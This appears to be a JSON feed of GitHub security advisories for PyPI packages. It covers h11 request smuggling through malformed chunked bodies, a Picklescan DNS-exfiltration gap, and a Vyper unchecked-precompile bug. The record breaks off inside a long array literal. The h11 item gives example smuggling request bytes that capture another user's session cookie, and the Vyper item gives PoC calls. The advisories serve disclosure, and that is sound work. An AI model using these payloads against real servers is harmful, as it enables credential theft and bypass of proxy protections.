{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Python packages hosted at PyPI.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/pip.json",
    "description": "Security Advisory for Python packages hosted at PyPI.org on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A leniency in h11's parsing of line terminators in chunked-coding message bodies can lead to request smuggling vulnerabilities under certain conditions.</p>\n<h3 id=\"details\">Details</h3>\n<p>HTTP/1.1 Chunked-Encoding bodies are formatted as a sequence of \"chunks\", each of which consists of:</p>\n<ul>\n<li>chunk length</li>\n<li><code>\\r\\n</code></li>\n<li><code>length</code> bytes of content</li>\n<li><code>\\r\\n</code></li>\n</ul>\n<p>In versions of h11 up to 0.14.0, h11 instead parsed them as:</p>\n<ul>\n<li>chunk length</li>\n<li><code>\\r\\n</code></li>\n<li><code>length</code> bytes of content</li>\n<li>any two bytes</li>\n</ul>\n<p>i.e. it did not validate that the trailing <code>\\r\\n</code> bytes were correct, and if you put 2 bytes of garbage there it would be accepted, instead of correctly rejecting the body as malformed.</p>\n<p>By itself this is harmless. However, suppose you have a proxy or reverse-proxy that tries to analyze HTTP requests, and your proxy has a <em>different</em> bug in parsing Chunked-Encoding, acting as if the format is:</p>\n<ul>\n<li>chunk length</li>\n<li><code>\\r\\n</code></li>\n<li><code>length</code> bytes of content</li>\n<li>more bytes of content, as many as it takes until you find a <code>\\r\\n</code></li>\n</ul>\n<p>For example, <a href=\"https://github.com/graygnuorg/pound/pull/43\">pound</a> had this bug -- it can happen if an implementer uses a generic \"read until end of line\" helper to consumes the trailing <code>\\r\\n</code>.</p>\n<p>In this case, h11 and your proxy may both accept the same stream of bytes, but interpret them differently. For example, consider the following HTTP request(s) (assume all line breaks are <code>\\r\\n</code>):</p>\n<pre><code>GET /one HTTP/1.1\nHost: localhost\nTransfer-Encoding: chunked\n\n5\nAAAAAXX2\n45\n0\n\nGET /two HTTP/1.1\nHost: localhost\nTransfer-Encoding: chunked\n\n0\n</code></pre>\n<p>Here h11 will interpret it as two requests, one with body <code>AAAAA45</code> and one with an empty body, while our hypothetical buggy proxy will interpret it as a single request, with body <code>AAAAXX20\\r\\n\\r\\nGET /two ...</code>. And any time two HTTP processors both accept the same string of bytes but interpret them differently, you have the conditions for a \"request smuggling\" attack. For example, if <code>/two</code> is a dangerous endpoint and the job of the reverse proxy is to stop requests from getting there, then an attacker could use a bytestream like the above to circumvent this protection.</p>\n<p>Even worse, if our buggy reverse proxy receives two requests from different users:</p>\n<pre><code>GET /one HTTP/1.1\nHost: localhost\nTransfer-Encoding: chunked\n\n5\nAAAAAXX999\n0\n</code></pre>\n<pre><code>GET /two HTTP/1.1\nHost: localhost\nCookie: SESSION_KEY=abcdef...\n</code></pre>\n<p>...it will consider the first request to be complete and valid, and send both on to the h11-based web server over the same socket. The server will then see the two concatenated requests, and interpret them as <em>one</em> request to <code>/one</code> whose body includes <code>/two</code>'s session key, potentially allowing one user to steal another's credentials.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Fixed in h11 0.15.0.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Since exploitation requires the combination of buggy h11 with a buggy (reverse) proxy, fixing either component is sufficient to mitigate this issue.</p>\n<h3 id=\"credits\">Credits</h3>\n<p>Reported by Jeppe Bonde Weikop on 2025-01-09.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/python-hyper/h11/security/advisories/GHSA-vqfr-h8mv-ghfj\">https://github.com/python-hyper/h11/security/advisories/GHSA-vqfr-h8mv-ghfj</a></li>\n<li><a href=\"https://github.com/python-hyper/h11/commit/114803a29ce50116dc47951c690ad4892b1a36ed\">https://github.com/python-hyper/h11/commit/114803a29ce50116dc47951c690ad4892b1a36ed</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-43859\">https://nvd.nist.gov/vuln/detail/CVE-2025-43859</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vqfr-h8mv-ghfj\">https://github.com/advisories/GHSA-vqfr-h8mv-ghfj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vqfr-h8mv-ghfj",
            "title": "[h11] h11 accepts some malformed Chunked-Encoding bodies",
            "date_modified": "2025-04-24T21:41:39.000Z",
            "date_published": "2025-04-24T16:07:56.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vqfr-h8mv-ghfj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"duplicate-advisory\">Duplicate Advisory</h1>\n<p>This advisory has been withdrawn because it is a duplicate of GHSA-93mv-x874-956g. This link is maintained to preserve external references.</p>\n<h1 id=\"original-description\">Original Description</h1>\n<p>The unsafe globals in Picklescan before 0.0.25 do not include ssl. Consequently, ssl.get_server_certificate can exfiltrate data via DNS after deserialization.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-46417\">https://nvd.nist.gov/vuln/detail/CVE-2025-46417</a></li>\n<li><a href=\"https://github.com/mmaitre314/picklescan/pull/40\">https://github.com/mmaitre314/picklescan/pull/40</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-93mv-x874-956g\">https://github.com/advisories/GHSA-93mv-x874-956g</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4p4h-9gvq-7xfg\">https://github.com/advisories/GHSA-4p4h-9gvq-7xfg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4p4h-9gvq-7xfg",
            "title": "[picklescan] Duplicate Advisory: Picklescan Vulnerable to Exfiltration via DNS via linecache and ssl.get_server_certificate",
            "date_modified": "2025-04-24T16:02:12.000Z",
            "date_published": "2025-04-24T03:31:32.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4p4h-9gvq-7xfg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>When the Vyper Compiler uses the precompiles EcRecover (0x1) and Identity (0x4), the success flag of the call is not checked. As a consequence an attacker can provide a specific amount of gas to make these calls fail but let the overall execution continue. Then the execution result can be incorrect.</p>\n<p>Based on EVM's rules, after the failed precompile the remaining code has only 1/64 of the pre-call-gas left (as 63/64 were forwarded and spent). Hence, only fairly simple executions can follow the failed precompile calls. Therefore, we found no significantly impacted real-world contracts.</p>\n<p>The fix is tracked in <a href=\"https://github.com/vyperlang/vyper/pull/4451\">https://github.com/vyperlang/vyper/pull/4451</a>.</p>\n<h3 id=\"details\">Details</h3>\n<h4 id=\"the-relevant-precompiles\">The relevant precompiles</h4>\n<h5 id=\"ecrecover\">EcRecover</h5>\n<p>EcRecover is used in vyper's <code>ecrecover</code> built-in. As the precompile consumes 3000 gas, any execution after an out-of-gas EcRecover call has at most 47 gas left.</p>\n<h5 id=\"identity\">Identity</h5>\n<ul>\n<li>The Identity precompile is used in vyper to perform memory copy operations. As its cost is variable, a variable amount of gas might be left after a failed call. The bigger the copy operation, the more gas can be left. Hence, a failed call to Identity could theoretically be followed by successful storage changes or emitted events.</li>\n<li>Identity is no longer used when <code>evm-version</code> <code>cancun</code> is used (because <code>MCOPY</code> is used instead). In 0.4.0 <code>cancun</code> is default, in 0.3.10 <code>cancun</code> is an option, otherwise <code>cancun</code> is not available. As only pre-<code>cancun</code> versions are relevant, we don't have to consider transient storage operations succeeding a failed call to Identity.</li>\n</ul>\n<h4 id=\"the-other-precompiles\">The other precompiles</h4>\n<ul>\n<li>Calls to <code>Sha2</code>, <code>ecAdd</code>, and <code>ecMul</code> have success checks and have had them for a long time.</li>\n<li>The precompiles <code>modexp</code>, <code>ripe</code>, <code>blake</code>, <code>ecPairing</code>, and <code>Point Evaluation</code> have no builtins in vyper.</li>\n</ul>\n<h3 id=\"poc\">PoC</h3>\n<p>In the following we provide concrete examples of incorrectly generated bytecode. These examples are not optimized, but rather Proof-of-Concepts. The list is also not exhaustive.</p>\n<h4 id=\"ecrecover-use\"><code>ecrecover</code> use</h4>\n<ul>\n<li>Affected versions: 0.2.0 - 0.4.0 </li>\n<li>For older compiler versions (&lt;=0.3.9) it behaves similarly to this <a href=\"https://github.com/vyperlang/vyper/security/advisories/GHSA-f5x6-7qgp-jhf3\">older advisory</a>. As no data is returned, the previous value of the memory word is returned to the user. Hence, any dirty bytes might be returned. Contracts with older compiler versions and <code>ecrecover</code> were checked.</li>\n<li>For new vyper versions, the output buffer is zeroed, so when the call fails zero is returned. This is an incorrect result, but developers should anyway check for 0 as a failure case. Hence, this is unlikely to result in issues. However, we did search for such cases.</li>\n<li>As mentioned above at most 47 gas is left after the failed call, hence a <code>return</code> is the most realistic scenario to be attacked.</li>\n</ul>\n<p>Vulnerable Code:</p>\n<pre><code class=\"language-py\">@external\n@view\ndef foo(hash: bytes32, v: uint256, r:uint256, s:uint256) -&gt; address:\n    return ecrecover(hash, v, r, s)\n</code></pre>\n<p>Problematic Call:</p>\n<pre><code class=\"language-py\">print(\n    c.foo(\n        binascii.unhexlify(\n            \"6c9c5e133b8aafb2ea74f524a5263495e7ae5701c7248805f7b511d973dc7055\"\n        ),\n        28,\n        78616903610408968922803823221221116251138855211764625814919875002740131251724,\n        37668412420813231458864536126575229553064045345107737433087067088194345044408,\n    )\n)  # Returns 0x9eE53ad38Bb67d745223a4257D7d48cE973FeB7A\n\nprint(\n    c.foo(\n        binascii.unhexlify(\n            \"6c9c5e133b8aafb2ea74f524a5263495e7ae5701c7248805f7b511d973dc7055\"\n        ),\n        28,\n        78616903610408968922803823221221116251138855211764625814919875002740131251724,\n        37668412420813231458864536126575229553064045345107737433087067088194345044408,\n        gas=3000,\n    )\n)  # Returns 0x0000000000000000000000000000000000000000\n</code></pre>\n<h4 id=\"identity-to-copy-dynamic-arrays\">Identity to copy Dynamic Arrays</h4>\n<ul>\n<li>Affected versions: 0.3.2 - 0.3.9</li>\n<li>Dynamic Arrays might be copied on different occasions</li>\n<li>That copy operation can fail leading to incorrect accesses afterwards</li>\n</ul>\n<p>Vulnerable Code:</p>\n<pre><code class=\"language-py\">\n@external\ndef foo() -&gt; uint256:\n    a: DynArray[uint256, 4000] = [2, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 